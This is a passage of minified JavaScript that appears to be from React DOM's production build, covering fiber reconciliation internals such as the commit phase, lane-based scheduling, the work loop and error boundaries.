ne(t),null;if(r=(t.flags&128)!==0,i=l.rendering,i===null)if(r)vn(l,!1);else{if(K!==0||e!==null&&e.flags&128)for(e=t.child;e!==null;){if(i=Gr(e),i!==null){for(t.flags|=128,vn(l,!1),r=i.updateQueue,r!==null&&(t.updateQueue=r,t.flags|=4),t.subtreeFlags=0,r=n,n=t.child;n!==null;)l=n,e=r,l.flags&=14680066,i=l.alternate,i===null?(l.childLanes=0,l.lanes=e,l.child=null,l.subtreeFlags=0,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null,l.stateNode=null):(l.childLanes=i.childLanes,l.lanes=i.lanes,l.child=i.child,l.subtreeFlags=0,l.deletions=null,l.memoizedProps=i.memoizedProps,l.memoizedState=i.memoizedState,l.updateQueue=i.updateQueue,l.type=i.type,e=i.dependencies,l.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),n=n.sibling;return I(H,H.current&1|2),t.child}e=e.sibling}l.tail!==null&&J()>on&&(t.flags|=128,r=!0,vn(l,!1),t.lanes=4194304)}else{if(!r)if(e=Gr(i),e!==null){if(t.flags|=128,r=!0,n=e.updateQueue,n!==null&&(t.updateQueue=n,t.flags|=4),vn(l,!0),l.tail===null&&l.tailMode==="hidden"&&!i.alternate&&!z)return ne(t),null}else 2*J()-l.renderingStartTime>on&&n!==1073741824&&(t.flags|=128,r=!0,vn(l,!1),t.lanes=4194304);l.isBackwards?(i.sibling=t.child,t.child=i):(n=l.last,n!==null?n.sibling=i:t.child=i,l.last=i)}return l.tail!==null?(t=l.tail,l.rendering=t,l.tail=t.sibling,l.renderingStartTime=J(),t.sibling=null,n=H.current,I(H,r?n&1|2:n&1),t):(ne(t),null);case 22:case 23:return Ni(),r=t.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(t.flags|=8192),r&&t.mode&1?he&1073741824&&(ne(t),t.subtreeFlags&6&&(t.flags|=8192)):ne(t),null;case 24:return null;case 25:return null}throw Error(y(156,t.tag))}function gf(e,t){switch(ui(t),t.tag){case 1:return pe(t.type)&&Ur(),e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 3:return nn(),_(fe),_(oe),yi(),e=t.flags,e&65536&&!(e&128)?(t.flags=e&-65537|128,t):null;case 5:return vi(t),null;case 13:if(_(H),e=t.memoizedState,e!==null&&e.dehydrated!==null){if(t.alternate===null)throw Error(y(340));en()}return e=t.flags,e&65536?(t.flags=e&-65537|128,t):null;case 19:return _(H),null;case 4:return nn(),null;case 10:return pi(t.type._context),null;case 22:case 23:return Ni(),null;case 24:return null;default:return null}}var gr=!1,re=!1,vf=typeof WeakSet=="function"?WeakSet:Set,C=null;function bt(e,t){var n=e.ref;if(n!==null)if(typeof n=="function")try{n(null)}catch(r){B(e,t,r)}else n.current=null}function Dl(e,t,n){try{n()}catch(r){B(e,t,r)}}var As=!1;function yf(e,t){if(gl=_r,e=$a(),si(e)){if("selectionStart"in e)var n={start:e.selectionStart,end:e.selectionEnd};else e:{n=(n=e.ownerDocument)&&n.defaultView||window;var r=n.getSelection&&n.getSelection();if(r&&r.rangeCount!==0){n=r.anchorNode;var o=r.anchorOffset,l=r.focusNode;r=r.focusOffset;try{n.nodeType,l.nodeType}catch{n=null;break e}var i=0,s=-1,a=-1,c=0,f=0,m=e,h=null;t:for(;;){for(var S;m!==n||o!==0&&m.nodeType!==3||(s=i+o),m!==l||r!==0&&m.nodeType!==3||(a=i+r),m.nodeType===3&&(i+=m.nodeValue.length),(S=m.firstChild)!==null;)h=m,m=S;for(;;){if(m===e)break t;if(h===n&&++c===o&&(s=i),h===l&&++f===r&&(a=i),(S=m.nextSibling)!==null)break;m=h,h=m.parentNode}m=S}n=s===-1||a===-1?null:{start:s,end:a}}else n=null}n=n||{start:0,end:0}}else n=null;for(vl={focusedElem:e,selectionRange:n},_r=!1,C=t;C!==null;)if(t=C,e=t.child,(t.subtreeFlags&1028)!==0&&e!==null)e.return=t,C=e;else for(;C!==null;){t=C;try{var w=t.alternate;if(t.flags&1024)switch(t.tag){case 0:case 11:case 15:break;case 1:if(w!==null){var k=w.memoizedProps,F=w.memoizedState,d=t.stateNode,u=d.getSnapshotBeforeUpdate(t.elementType===t.type?k:Ne(t.type,k),F);d.__reactInternalSnapshotBeforeUpdate=u}break;case 3:var p=t.stateNode.containerInfo;p.nodeType===1?p.textContent="":p.nodeType===9&&p.documentElement&&p.removeChild(p.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(y(163))}}catch(v){B(t,t.return,v)}if(e=t.sibling,e!==null){e.return=t.return,C=e;break}C=t.return}return w=As,As=!1,w}function Nn(e,t,n){var r=t.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var o=r=r.next;do{if((o.tag&e)===e){var l=o.destroy;o.destroy=void 0,l!==void 0&&Dl(t,n,l)}o=o.next}while(o!==r)}}function fo(e,t){if(t=t.updateQueue,t=t!==null?t.lastEffect:null,t!==null){var n=t=t.next;do{if((n.tag&e)===e){var r=n.create;n.destroy=r()}n=n.next}while(n!==t)}}function Il(e){var t=e.ref;if(t!==null){var n=e.stateNode;switch(e.tag){case 5:e=n;break;default:e=n}typeof t=="function"?t(e):t.current=e}}function Bu(e){var t=e.alternate;t!==null&&(e.alternate=null,Bu(t)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(t=e.stateNode,t!==null&&(delete t[Fe],delete t[Bn],delete t[wl],delete t[Zd],delete t[ef])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function Vu(e){return e.tag===5||e.tag===3||e.tag===4}function _s(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||Vu(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Al(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.nodeType===8?n.parentNode.insertBefore(e,t):n.insertBefore(e,t):(n.nodeType===8?(t=n.parentNode,t.insertBefore(e,n)):(t=n,t.appendChild(e)),n=n._reactRootContainer,n!=null||t.onclick!==null||(t.onclick=Hr));else if(r!==4&&(e=e.child,e!==null))for(Al(e,t,n),e=e.sibling;e!==null;)Al(e,t,n),e=e.sibling}function _l(e,t,n){var r=e.tag;if(r===5||r===6)e=e.stateNode,t?n.insertBefore(e,t):n.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(_l(e,t,n),e=e.sibling;e!==null;)_l(e,t,n),e=e.sibling}var q=null,Me=!1;function Xe(e,t,n){for(n=n.child;n!==null;)bu(e,t,n),n=n.sibling}function bu(e,t,n){if(ze&&typeof ze.onCommitFiberUnmount=="function")try{ze.onCommitFiberUnmount(ro,n)}catch{}switch(n.tag){case 5:re||bt(n,t);case 6:var r=q,o=Me;q=null,Xe(e,t,n),q=r,Me=o,q!==null&&(Me?(e=q,n=n.stateNode,e.nodeType===8?e.parentNode.removeChild(n):e.removeChild(n)):q.removeChild(n.stateNode));break;case 18:q!==null&&(Me?(e=q,n=n.stateNode,e.nodeType===8?zo(e.parentNode,n):e.nodeType===1&&zo(e,n),Fn(e)):zo(q,n.stateNode));break;case 4:r=q,o=Me,q=n.stateNode.containerInfo,Me=!0,Xe(e,t,n),q=r,Me=o;break;case 0:case 11:case 14:case 15:if(!re&&(r=n.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){o=r=r.next;do{var l=o,i=l.destroy;l=l.tag,i!==void 0&&(l&2||l&4)&&Dl(n,t,i),o=o.next}while(o!==r)}Xe(e,t,n);break;case 1:if(!re&&(bt(n,t),r=n.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=n.memoizedProps,r.state=n.memoizedState,r.componentWillUnmount()}catch(s){B(n,t,s)}Xe(e,t,n);break;case 21:Xe(e,t,n);break;case 22:n.mode&1?(re=(r=re)||n.memoizedState!==null,Xe(e,t,n),re=r):Xe(e,t,n);break;default:Xe(e,t,n)}}function Fs(e){var t=e.updateQueue;if(t!==null){e.updateQueue=null;var n=e.stateNode;n===null&&(n=e.stateNode=new vf),t.forEach(function(r){var o=jf.bind(null,e,r);n.has(r)||(n.add(r),r.then(o,o))})}}function Re(e,t){var n=t.deletions;if(n!==null)for(var r=0;r<n.length;r++){var o=n[r];try{var l=e,i=t,s=i;e:for(;s!==null;){switch(s.tag){case 5:q=s.stateNode,Me=!1;break e;case 3:q=s.stateNode.containerInfo,Me=!0;break e;case 4:q=s.stateNode.containerInfo,Me=!0;break e}s=s.return}if(q===null)throw Error(y(160));bu(l,i,o),q=null,Me=!1;var a=o.alternate;a!==null&&(a.return=null),o.return=null}catch(c){B(o,t,c)}}if(t.subtreeFlags&12854)for(t=t.child;t!==null;)Ju(t,e),t=t.sibling}function Ju(e,t){var n=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Re(t,e),Ae(e),r&4){try{Nn(3,e,e.return),fo(3,e)}catch(k){B(e,e.return,k)}try{Nn(5,e,e.return)}catch(k){B(e,e.return,k)}}break;case 1:Re(t,e),Ae(e),r&512&&n!==null&&bt(n,n.return);break;case 5:if(Re(t,e),Ae(e),r&512&&n!==null&&bt(n,n.return),e.flags&32){var o=e.stateNode;try{Dn(o,"")}catch(k){B(e,e.return,k)}}if(r&4&&(o=e.stateNode,o!=null)){var l=e.memoizedProps,i=n!==null?n.memoizedProps:l,s=e.type,a=e.updateQueue;if(e.updateQueue=null,a!==null)try{s==="input"&&l.type==="radio"&&l.name!=null&&pa(o,l),il(s,i);var c=il(s,l);for(i=0;i<a.length;i+=2){var f=a[i],m=a[i+1];f==="style"?ya(o,m):f==="dangerouslySetInnerHTML"?ga(o,m):f==="children"?Dn(o,m):Kl(o,f,m,c)}switch(s){case"input":tl(o,l);break;case"textarea":ma(o,l);break;case"select":var h=o._wrapperState.wasMultiple;o._wrapperState.wasMultiple=!!l.multiple;var S=l.value;S!=null?$t(o,!!l.multiple,S,!1):h!==!!l.multiple&&(l.defaultValue!=null?$t(o,!!l.multiple,l.defaultValue,!0):$t(o,!!l.multiple,l.multiple?[]:"",!1))}o[Bn]=l}catch(k){B(e,e.return,k)}}break;case 6:if(Re(t,e),Ae(e),r&4){if(e.stateNode===null)throw Error(y(162));o=e.stateNode,l=e.memoizedProps;try{o.nodeValue=l}catch(k){B(e,e.return,k)}}break;case 3:if(Re(t,e),Ae(e),r&4&&n!==null&&n.memoizedState.isDehydrated)try{Fn(t.containerInfo)}catch(k){B(e,e.return,k)}break;case 4:Re(t,e),Ae(e);break;case 13:Re(t,e),Ae(e),o=e.child,o.flags&8192&&(l=o.memoizedState!==null,o.stateNode.isHidden=l,!l||o.alternate!==null&&o.alternate.memoizedState!==null||(ji=J())),r&4&&Fs(e);break;case 22:if(f=n!==null&&n.memoizedState!==null,e.mode&1?(re=(c=re)||f,Re(t,e),re=c):Re(t,e),Ae(e),r&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!f&&e.mode&1)for(C=e,f=e.child;f!==null;){for(m=C=f;C!==null;){switch(h=C,S=h.child,h.tag){case 0:case 11:case 14:case 15:Nn(4,h,h.return);break;case 1:bt(h,h.return);var w=h.stateNode;if(typeof w.componentWillUnmount=="function"){r=h,n=h.return;try{t=r,w.props=t.memoizedProps,w.state=t.memoizedState,w.componentWillUnmount()}catch(k){B(r,n,k)}}break;case 5:bt(h,h.return);break;case 22:if(h.memoizedState!==null){Hs(m);continue}}S!==null?(S.return=h,C=S):Hs(m)}f=f.sibling}e:for(f=null,m=e;;){if(m.tag===5){if(f===null){f=m;try{o=m.stateNode,c?(l=o.style,typeof l.setProperty=="function"?l.setProperty("display","none","important"):l.display="none"):(s=m.stateNode,a=m.memoizedProps.style,i=a!=null&&a.hasOwnProperty("display")?a.display:null,s.style.display=va("display",i))}catch(k){B(e,e.return,k)}}}else if(m.tag===6){if(f===null)try{m.stateNode.nodeValue=c?"":m.memoizedProps}catch(k){B(e,e.return,k)}}else if((m.tag!==22&&m.tag!==23||m.memoizedState===null||m===e)&&m.child!==null){m.child.return=m,m=m.child;continue}if(m===e)break e;for(;m.sibling===null;){if(m.return===null||m.return===e)break e;f===m&&(f=null),m=m.return}f===m&&(f=null),m.sibling.return=m.return,m=m.sibling}}break;case 19:Re(t,e),Ae(e),r&4&&Fs(e);break;case 21:break;default:Re(t,e),Ae(e)}}function Ae(e){var t=e.flags;if(t&2){try{e:{for(var n=e.return;n!==null;){if(Vu(n)){var r=n;break e}n=n.return}throw Error(y(160))}switch(r.tag){case 5:var o=r.stateNode;r.flags&32&&(Dn(o,""),r.flags&=-33);var l=_s(e);_l(e,l,o);break;case 3:case 4:var i=r.stateNode.containerInfo,s=_s(e);Al(e,s,i);break;default:throw Error(y(161))}}catch(a){B(e,e.return,a)}e.flags&=-3}t&4096&&(e.flags&=-4097)}function Sf(e,t,n){C=e,$u(e)}function $u(e,t,n){for(var r=(e.mode&1)!==0;C!==null;){var o=C,l=o.child;if(o.tag===22&&r){var i=o.memoizedState!==null||gr;if(!i){var s=o.alternate,a=s!==null&&s.memoizedState!==null||re;s=gr;var c=re;if(gr=i,(re=a)&&!c)for(C=o;C!==null;)i=C,a=i.child,i.tag===22&&i.memoizedState!==null?Us(o):a!==null?(a.return=i,C=a):Us(o);for(;l!==null;)C=l,$u(l),l=l.sibling;C=o,gr=s,re=c}zs(e)}else o.subtreeFlags&8772&&l!==null?(l.return=o,C=l):zs(e)}}function zs(e){for(;C!==null;){var t=C;if(t.flags&8772){var n=t.alternate;try{if(t.flags&8772)switch(t.tag){case 0:case 11:case 15:re||fo(5,t);break;case 1:var r=t.stateNode;if(t.flags&4&&!re)if(n===null)r.componentDidMount();else{var o=t.elementType===t.type?n.memoizedProps:Ne(t.type,n.memoizedProps);r.componentDidUpdate(o,n.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var l=t.updateQueue;l!==null&&Cs(t,l,r);break;case 3:var i=t.updateQueue;if(i!==null){if(n=null,t.child!==null)switch(t.child.tag){case 5:n=t.child.stateNode;break;case 1:n=t.child.stateNode}Cs(t,i,n)}break;case 5:var s=t.stateNode;if(n===null&&t.flags&4){n=s;var a=t.memoizedProps;switch(t.type){case"button":case"input":case"select":case"textarea":a.autoFocus&&n.focus();break;case"img":a.src&&(n.src=a.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(t.memoizedState===null){var c=t.alternate;if(c!==null){var f=c.memoizedState;if(f!==null){var m=f.dehydrated;m!==null&&Fn(m)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(y(163))}re||t.flags&512&&Il(t)}catch(h){B(t,t.return,h)}}if(t===e){C=null;break}if(n=t.sibling,n!==null){n.return=t.return,C=n;break}C=t.return}}function Hs(e){for(;C!==null;){var t=C;if(t===e){C=null;break}var n=t.sibling;if(n!==null){n.return=t.return,C=n;break}C=t.return}}function Us(e){for(;C!==null;){var t=C;try{switch(t.tag){case 0:case 11:case 15:var n=t.return;try{fo(4,t)}catch(a){B(t,n,a)}break;case 1:var r=t.stateNode;if(typeof r.componentDidMount=="function"){var o=t.return;try{r.componentDidMount()}catch(a){B(t,o,a)}}var l=t.return;try{Il(t)}catch(a){B(t,l,a)}break;case 5:var i=t.return;try{Il(t)}catch(a){B(t,i,a)}}}catch(a){B(t,t.return,a)}if(t===e){C=null;break}var s=t.sibling;if(s!==null){s.return=t.return,C=s;break}C=t.return}}var wf=Math.ceil,Xr=Qe.ReactCurrentDispatcher,Ei=Qe.ReactCurrentOwner,Te=Qe.ReactCurrentBatchConfig,L=0,Y=null,$=null,Z=0,he=0,Jt=ht(0),K=0,Kn=null,Nt=0,po=0,Pi=0,Mn=null,ue=null,ji=0,on=1/0,Ue=null,Yr=!1,Fl=null,ut=null,vr=!1,rt=null,qr=0,On=0,zl=null,Rr=-1,Nr=0;function ie(){return L&6?J():Rr!==-1?Rr:Rr=J()}function ct(e){return e.mode&1?L&2&&Z!==0?Z&-Z:nf.transition!==null?(Nr===0&&(Nr=Ma()),Nr):(e=D,e!==0||(e=window.event,e=e===void 0?16:Fa(e.type)),e):1}function De(e,t,n,r){if(50<On)throw On=0,zl=null,Error(y(185));Xn(e,n,r),(!(L&2)||e!==Y)&&(e===Y&&(!(L&2)&&(po|=n),K===4&&tt(e,Z)),me(e,r),n===1&&L===0&&!(t.mode&1)&&(on=J()+500,ao&&gt()))}function me(e,t){var n=e.callbackNode;nd(e,t);var r=Ar(e,e===Y?Z:0);if(r===0)n!==null&&Qi(n),e.callbackNode=null,e.callbackPriority=0;else if(t=r&-r,e.callbackPriority!==t){if(n!=null&&Qi(n),t===1)e.tag===0?tf(Ws.bind(null,e)):nu(Ws.bind(null,e)),Yd(function(){!(L&6)&&gt()}),n=null;else{switch(Oa(r)){case 1:n=Zl;break;case 4:n=Ra;break;case 16:n=Ir;break;case 536870912:n=Na;break;default:n=Ir}n=ec(n,Gu.bind(null,e))}e.callbackPriority=t,e.callbackNode=n}}function Gu(e,t){if(Rr=-1,Nr=0,L&6)throw Error(y(327));var n=e.callbackNode;if(Yt()&&e.callbackNode!==n)return null;var r=Ar(e,e===Y?Z:0);if(r===0)return null;if(r&30||r&e.expiredLanes||t)t=Zr(e,r);else{t=r;var o=L;L|=2;var l=Qu();(Y!==e||Z!==t)&&(Ue=null,on=J()+500,Tt(e,t));do try{xf();break}catch(s){Ku(e,s)}while(!0);fi(),Xr.current=l,L=o,$!==null?t=0:(Y=null,Z=0,t=K)}if(t!==0){if(t===2&&(o=dl(e),o!==0&&(r=o,t=Hl(e,o))),t===1)throw n=Kn,Tt(e,0),tt(e,r),me(e,J()),n;if(t===6)tt(e,r);else{if(o=e.current.alternate,!(r&30)&&!kf(o)&&(t=Zr(e,r),t===2&&(l=dl(e),l!==0&&(r=l,t=Hl(e,l))),t===1))throw n=Kn,Tt(e,0),tt(e,r),me(e,J()),n;switch(e.finishedWork=o,e.finishedLanes=r,t){case 0:case 1:throw Error(y(345));case 2:wt(e,ue,Ue);break;case 3:if(tt(e,r),(r&130023424)===r&&(t=ji+500-J(),10<t)){if(Ar(e,0)!==0)break;if(o=e.suspendedLanes,(o&r)!==r){ie(),e.pingedLanes|=e.suspendedLanes&o;break}e.timeoutHandle=Sl(wt.bind(null,e,ue,Ue),t);break}wt(e,ue,Ue);break;case 4:if(tt(e,r),(r&4194240)===r)break;for(t=e.eventTimes,o=-1;0<r;){var i=31-Le(r);l=1<<i,i=t[i],i>o&&(o=i),r&=~l}if(r=o,r=J()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*wf(r/1960))-r,10<r){e.timeoutHandle=Sl(wt.bind(null,e,ue,Ue),r);break}wt(e,ue,Ue);break;case 5:wt(e,ue,Ue);break;default:throw Error(y(329))}}}return me(e,J()),e.callbackNode===n?Gu.bind(null,e):null}function Hl(e,t){var n=Mn;return e.current.memoizedState.isDehydrated&&(Tt(e,t).flags|=256),e=Zr(e,t),e!==2&&(t=ue,ue=n,t!==null&&Ul(t)),e}function Ul(e){ue===null?ue=e:ue.push.apply(ue,e)}function kf(e){for(var t=e;;){if(t.flags&16384){var n=t.updateQueue;if(n!==null&&(n=n.stores,n!==null))for(var r=0;r<n.length;r++){var o=n[r],l=o.getSnapshot;o=o.value;try{if(!Ie(l(),o))return!1}catch{return!1}}}if(n=t.child,t.subtreeFlags&16384&&n!==null)n.return=t,t=n;else{if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return!0;t=t.return}t.sibling.return=t.return,t=t.sibling}}return!0}function tt(e,t){for(t&=~Pi,t&=~po,e.suspendedLanes|=t,e.pingedLanes&=~t,e=e.expirationTimes;0<t;){var n=31-Le(t),r=1<<n;e[n]=-1,t&=~r}}function Ws(e){if(L&6)throw Error(y(327));Yt();var t=Ar(e,0);if(!(t&1))return me(e,J()),null;var n=Zr(e,t);if(e.tag!==0&&n===2){var r=dl(e);r!==0&&(t=r,n=Hl(e,r))}if(n===1)throw n=Kn,Tt(e,0),tt(e,t),me(e,J()),n;if(n===6)throw Error(y(345));return e.finishedWork=e.current.alternate,e.finishedLanes=t,wt(e,ue,Ue),me(e,J()),null}function Ri(e,t){var n=L;L|=1;try{return e(t)}finally{L=n,L===0&&(on=J()+500,ao&&gt())}}function Mt(e){rt!==null&&rt.tag===0&&!(L&6)&&Yt();var t=L;L|=1;var n=Te.transition,r=D;try{if(Te.transition=null,D=1,e)return e()}finally{D=r,Te.transition=n,L=t,!(L&6)&&gt()}}function Ni(){he=Jt.current,_(Jt)}function Tt(e,t){e.finishedWork=null,e.finishedLanes=0;var n=e.timeoutHandle;if(n!==-1&&(e.timeoutHandle=-1,Xd(n)),$!==null)for(n=$.return;n!==null;){var r=n;switch(ui(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&Ur();break;case 3:nn(),_(fe),_(oe),yi();break;case 5:vi(r);break;case 4:nn();break;case 13:_(H);break;case 19:_(H);break;case 10:pi(r.type._context);break;case 22:case 23:Ni()}n=n.return}if(Y=e,$=e=dt(e.current,null),Z=he=t,K=0,Kn=null,Pi=po=Nt=0,ue=Mn=null,Ct!==null){for(t=0;t<Ct.length;t++)if(n=Ct[t],r=n.interleaved,r!==null){n.interleaved=null;var o=r.next,l=n.pending;if(l!==null){var i=l.next;l.next=o,r.next=i}n.pending=r}Ct=null}return e}function Ku(e,t){do{var n=$;try{if(fi(),Er.current=Qr,Kr){for(var r=U.memoizedState;r!==null;){var o=r.queue;o!==null&&(o.pending=null),r=r.next}Kr=!1}if(Rt=0,X=G=U=null,Rn=!1,Jn=0,Ei.current=null,n===null||n.return===null){K=1,Kn=t,$=null;break}e:{var l=e,i=n.return,s=n,a=t;if(t=Z,s.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){var c=a,f=s,m=f.tag;if(!(f.mode&1)&&(m===0||m===11||m===15)){var h=f.alternate;h?(f.updateQueue=h.updateQueue,f.memoizedState=h.memoizedState,f.lanes=h.lanes):(f.updateQueue=null,f.memoizedState=null)}var S=Rs(i);if(S!==null){S.flags&=-257,Ns(S,i,s,l,t),S.mode&1&&js(l,c,t),t=S,a=c;var w=t.updateQueue;if(w===null){var k=new Set;k.add(a),t.updateQueue=k}else w.add(a);break e}else{if(!(t&1)){js(l,c,t),Mi();break e}a=Error(y(426))}}else if(z&&s.mode&1){var F=Rs(i);if(F!==null){!(F.flags&65536)&&(F.flags|=256),Ns(F,i,s,l,t),ci(rn(a,s));break e}}l=a=rn(a,s),K!==4&&(K=2),Mn===null?Mn=[l]:Mn.push(l),l=i;do{switch(l.tag){case 3:l.flags|=65536,t&=-t,l.lanes|=t;var d=Ou(l,a,t);ks(l,d);break e;case 1:s=a;var u=l.type,p=l.stateNode;if(!(l.flags&128)&&(typeof u.getDerivedStateFromError=="function"||p!==null&&typeof p.componentDidCatch=="function"&&(ut===null||!ut.has(p)))){l.flags|=65536,t&=-t,l.lanes|=t;var v=Lu(l,s,t);ks(l,v);break e}}l=l.return}while(l!==null)}Yu(n)}catch(x){t=x,$===n&&n!==null&&($=n=n.return);continue}break}while(!0)}function Qu(){var e=Xr.current;return Xr.current=Qr,e===null?Qr:e}function Mi(){(K===0||K===3||K===2)&&(K=4),Y===null||!(Nt&268435455)&&!(po&268435455)||tt(Y,Z)}function Zr(e,t){var n=L;L|=2;var r=Qu();(Y!==e||Z!==t)&&(Ue=null,Tt(e,t));do try{Cf();break}catch(o){Ku(e,o)}while(!0);if(fi(),L=n,Xr.current=r,$!==null)throw Error(y(261));return Y=null,Z=0,K}function Cf(){for(;$!==null;)Xu($)}function xf(){for(;$!==null&&!Gc();)Xu($)}function Xu(e){var t=Zu(e.alternate,e,he);e.memoizedProps=e.pendingProps,t===null?Yu(e):$=t,Ei.current=null}function Yu(e){var t=e;do{var n=t.alternate;if(e=t.return,t.flags&32768){if(n=gf(n,t),n!==null){n.flags&=32767,$=n;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{K=6,$=null;return}}else if(n=hf(n,t,he),n!==null){$=n;return}if(t=t.sibling,t!==null){$=t;return}$=t=e}while(t!==null);K===0&&(K=5)}function wt(e,t,n){var r=D,o=Te.transition;try{Te.transition=null,D=1,Tf(e,t,n,r)}finally{Te.transition=o,D=r}return null}function Tf(e,t,n,r){do Yt();while(rt!==null);if(L&6)throw Error(y(327));n=e.finishedWork;var o=e.finishedLanes;if(n===null)return null;if(e.finishedWork=null,e.finishedLanes=0,n===e.current)throw Error(y(177));e.callbackNode=null,e.callbackPriority=0;var l=n.lanes|n.childLanes;if(rd(e,l),e===Y&&($=Y=null,Z=0),!(n.subtreeFlags&2064)&&!(n.flags&2064)||vr||(vr=!0,ec(Ir,function(){return Yt(),null})),l=(n.flags&15990)!==0,n.subtreeFlags&15990||l){l=Te.transition,Te.transition=null;var i=D;D=1;var s=L;L|=4,Ei.current=null,yf(e,n),Ju(n,e),Vd(vl),_r=!!gl,vl=gl=null,e.current=n,Sf(n),Kc(),L=s,D=i,Te.transition=l}else e.current=n;if(vr&&(vr=!1,rt=e,qr=o),l=e.pendingLanes,l===0&&(ut=null),Yc(n.stateNode),me(e,J()),t!==null)for(r=e.onRecoverableError,n=0;n<t.length;n++)o=t[n],r(o.value,{componentStack:o.stack,digest:o.digest});if(Yr)throw Yr=!1,e=Fl,Fl=null,e;return qr&1&&e.tag!==0&&Yt(),l=e.pendingLanes,l&1?e===zl?On++:(On=0,zl=e):On=0,gt(),null}function Yt(){if(rt!==null){var e=Oa(qr),t=Te.transition,n=D;try{if(Te.transition=null,D=16>e?16:e,rt===null)var r=!1;else{if(e=rt,rt=null,qr=0,L&6)throw Error(y(331));var o=L;for(L|=4,C=e.current;C!==null;){var l=C,i=l.child;if(C.flags&16){var s=l.deletions;if(s!==null){for(var a=0;a<s.length;a++){var c=s[a];for(C=c;C!==null;){var f=C;switch(f.tag){case 0:case 11:case 15:Nn(8,f,l)}var m=f.child;if(m!==null)m.return=f,C=m;else for(;C!==null;){f=C;var h=f.sibling,S=f.return;if(Bu(f),f===c){C=null;break}if(h!==null){h.return=S,C=h;break}C=S}}}var w=l.alternate;if(w!==null){var k=w.child;if(k!==null){w.child=null;do{var F=k.sibling;k.sibling=null,k=F}while(k!==null)}}C=l}}if(l.subtreeFlags&2064&&i!==null)i.return=l,C=i;else e:for(;C!==null;){if(l=C,l.flags&2048)switch(l.tag){case 0:case 11:case 15:Nn(9,l,l.return)}var d=l.sibling;if(d!==null){d.return=l.return,C=d;break e}C=l.return}}var u=e.current;for(C=u;C!==null;){i=C;var p=i.child;if(i.subtreeFlags&2064&&p!==null)p.return=i,C=p;else e:for(i=u;C!==null;){if(s=C,s.flags&2048)try{switch(s.tag){case 0:case 11:case 15:fo(9,s)}}catch(x){B(s,s.return,x)}if(s===i){C=null;break e}var v=s.sibling;if(v!==null){v.return=s.return,C=v;break e}C=s.return}}if(L=o,gt(),ze&&typeof ze.onPostCommitFiberRoot=="function")try{ze.onPostCommitFiberRoot(ro,e)}catch{}r=!0}return r}finally{D=n,Te.transition=t}}return!1}function Bs(e,t,n){t=rn(n,t),t=Ou(e,t,1),e=at(e,t,1),t=ie(),e!==null&&(Xn(e,1,t),me(e,t))}function B(e,t,n){if(e.tag===3)Bs(e,e,n);else for(;t!==null;){if(t.tag===3){Bs(t,e,n);break}else if(t.tag===1){var r=t.stateNode;if(typeof t.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(ut===null||!ut.has(r))){e=rn(n,e),e=Lu(t,e,1),t=at(t,e,1),e=ie(),t!==null&&(Xn(t,1,e),me(t,e));break}}t=t.return}}function Ef(e,t,n){var r=e.pingCache;r!==null&&r.delete(t),t=ie(),e.pingedLanes|=e.suspendedLanes&n,Y===e&&(Z&n)===n&&(K===4||K===3&&(Z&130023424)===Z&&500>J()-ji?Tt(e,0):Pi|=n),me(e,t)}function qu(e,t){t===0&&(e.mode&1?(t=sr,sr<<=1,!(sr&130023424)&&(sr=4194304)):t=1);var n=ie();e=Ge(e,t),e!==null&&(Xn(e,t,n),me(e,n))}function Pf(e){var t=e.memoizedState,n=0;t!==null&&(n=t.retryLane),qu(e,n)}function jf(e,t){var n=0;switch(e.tag){case 13:var r=e.stateNode,o=e.memoizedState;o!==null&&(n=o.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(y(314))}r!==null&&r.delete(t),qu(e,n)}var Zu;Zu=function(e,t,n){if(e!==null)if(e.memoizedProps!==t.pendingProps||fe.current)de=!0;else{if(!(e.lanes&n)&&!(t.flags&128))return de=!1,mf(e,t,n);de=!!(e.flags&131072)}else de=!1,z&&t.flags&1048576&&ru(t,Vr,t.index);switch(t.lanes=0,t.tag){case 2:var r=t.type;jr(e,t),e=t.pendingProps;var o=Zt(t,oe.current);Xt(t,n),o=wi(null,t,r,e,o,n);var l=ki();return t.flags|=1,typeof o=="object"&&o!==null&&typeof o.render=="function"&&o.$$typeof===void 0?(t.tag=1,t.memoizedState=null,t.updateQueue=null,pe(r)?(l=!0,Wr(t)):l=!1,t.memoizedState=o.state!==null&&o.state!==void 0?o.state:null,hi(t),o.updater=co,t.stateNode=o,o._reactInternals=t,Pl(t,r,e,n),t=Nl(null,t,r,!0,l,n)):(t.tag=0,z&&l&&ai(t),le(null,t,o,n),t=t.child),t;case 16:r=t.elementType;e:{switch(jr(e,t),e=t.pendingProps,o=r._init,r=o(r._payload),t.type=r,o=t.tag=Nf(r),e=Ne(r,e),o){case 0:t=Rl(null,t,r,e,n);break e;case 1:t=Ls(null,t,r,e,n);break e;case 11:t=Ms(null,t,r,e,n);break 